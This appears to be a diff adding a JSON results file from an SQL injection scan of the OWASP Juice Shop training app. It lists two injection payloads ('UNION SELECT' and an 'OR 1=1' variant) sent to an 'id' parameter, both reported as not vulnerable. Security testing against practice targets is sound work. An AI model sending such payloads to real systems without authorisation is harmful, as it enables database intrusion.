@@ -1,0 +1,29 @@
+{
+  "meta": {
+    "base_url": "https://juice-shop.herokuapp.com",
+    "generated": "2025-09-09_01-45-57",
+    "targets": 1
+  },
+  "results": [
+    {
+      "type": "error_based",
+      "endpoint": "https://juice-shop.herokuapp.com",
+      "param": "id",
+      "url": "https://juice-shop.herokuapp.com?id=' UNION SELECT null--",
+      "payload": "' UNION SELECT null--",
+      "status": 200,
+      "vulnerable": false,
+      "evidence": ""
+    },
+    {
+      "type": "error_based",
+      "endpoint": "https://juice-shop.herokuapp.com",
+      "param": "id",
+      "url": "https://juice-shop.herokuapp.com?id=') OR ('1'='1",
+      "payload": "') OR ('1'='1",
+      "status": 200,
+      "vulnerable": false,
+      "evidence": ""
+    }
+  ]
+}
